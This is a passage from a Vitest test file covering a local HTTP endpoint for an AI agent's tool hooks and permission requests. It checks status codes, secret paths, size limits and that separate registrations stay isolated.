    expect(onToolHook).toHaveBeenLastCalledWith({
      phase: 'post',
      toolCallId: 'toolu_10',
      toolName: 'Bash',
      input: 'ls',
    });
  });

  it('reports a failed tool call as a post hook marked failed, and refuses unknown hook kinds', async () => {
    const onToolHook = vi.fn(() => Promise.resolve());
    const { endpoint } = register({ onToolHook }, { hooks: true });
    const body = JSON.stringify({ tool_name: 'Bash', tool_use_id: 'toolu_11', tool_input: {} });
    const failed = await hookCall(endpoint, 'post-failure', body);
    expect(failed.status).toBe(200);
    expect(onToolHook).toHaveBeenLastCalledWith({
      phase: 'post',
      toolCallId: 'toolu_11',
      toolName: 'Bash',
      input: {},
      failed: true,
    });
    const unknown = await hookCall(endpoint, 'sometime', body);
    expect(unknown.status).toBe(404);
    expect(onToolHook).toHaveBeenCalledTimes(1);
  });

  it('replies {} when the handler fails or is absent', async () => {
    const failing = register({ onToolHook: () => Promise.reject(new Error('x')) }, { hooks: true });
    const none = register({}, { hooks: true });
    const body = JSON.stringify({ tool_name: 'A', tool_use_id: 'b', tool_input: {} });
    for (const { endpoint } of [failing, none]) {
      const r = await hookCall(endpoint, 'pre', body);
      expect(r.status).toBe(200);
      expect(JSON.parse(r.body)).toEqual({});
    }
  });

  it('answers 404 for a wrong secret and after dispose, and for a registration without hooks', async () => {
    const { endpoint, registration } = register({ onToolHook: vi.fn() }, { hooks: true });
    const url = new URL(endpoint.hookUrl ?? '');
    const body = JSON.stringify({ tool_name: 'A', tool_use_id: 'b', tool_input: {} });
    const headers = { 'content-type': 'application/json' };
    const wrong = await send({ port: Number(url.port), path: '/hook/wrong/pre', headers, body })
      .reply;
    expect(wrong.status).toBe(404);
    const badPhase = await send({
      port: Number(url.port),
      path: `${url.pathname}/mid`,
      headers,
      body,
    }).reply;
    expect(badPhase.status).toBe(404);
    const get = await send({ port: Number(url.port), path: `${url.pathname}/pre`, method: 'GET' })
      .reply;
    expect(get.status).toBe(405);
    expect((await hookCall(endpoint, 'pre', body, { 'content-type': 'text/plain' })).status).toBe(
      415,
    );
    registration.dispose();
    expect((await hookCall(endpoint, 'pre', body)).status).toBe(404);
  });

  it('still answers {} for a malformed body and does not call the handler', async () => {
    const onToolHook = vi.fn(() => Promise.resolve());
    const { endpoint } = register({ onToolHook }, { hooks: true });
    for (const body of [
      'not json',
      '{}',
      JSON.stringify({ tool_name: 1, tool_use_id: 'x' }),
      '[]',
    ]) {
      const r = await hookCall(endpoint, 'pre', body);
      expect(r.status).toBe(200);
      expect(JSON.parse(r.body)).toEqual({});
    }
    expect(onToolHook).not.toHaveBeenCalled();
    expect(logs.lines.filter((l) => l.startsWith('warn '))).toHaveLength(4);
  });

  it('enforces the size cap on hooks', async () => {
    const { endpoint } = register({}, { hooks: true });
    const r = await hookCall(endpoint, 'pre', 'x'.repeat(5000));
    expect(r.status).toBe(413);
  });
});

describe('independent registrations', () => {
  it('keeps two registrations separate', async () => {
    const gateA = deferred<PermissionResponse>();
    const a = register({ onPermissionRequest: vi.fn(() => gateA.promise) });
    const b = register({
      onPermissionRequest: vi.fn(() =>
        Promise.resolve<PermissionResponse>({ behavior: 'deny', message: 'B' }),
      ),
    });
    const callA = permissionCall(a.endpoint, ARGS);
    await waitFor(() => vi.mocked(a.handlers.onPermissionRequest).mock.calls.length === 1);
    // Same tool call id on another route is a different request.
    const rb = await permissionCall(b.endpoint, ARGS).reply;
    expect(resultText(JSON.parse(rb.body) as Record<string, unknown>)).toBe(
      '{"behavior":"deny","message":"B"}',
    );
    expect(a.handlers.onPermissionRequest).toHaveBeenCalledTimes(1);
    a.registration.dispose();
    expect((await rpc(a.endpoint, 'ping')).reply.status).toBe(404);
    expect((await rpc(b.endpoint, 'ping')).reply.status).toBe(200);
    await callA.reply;
    gateA.resolve({ behavior: 'allow' });
  });
});
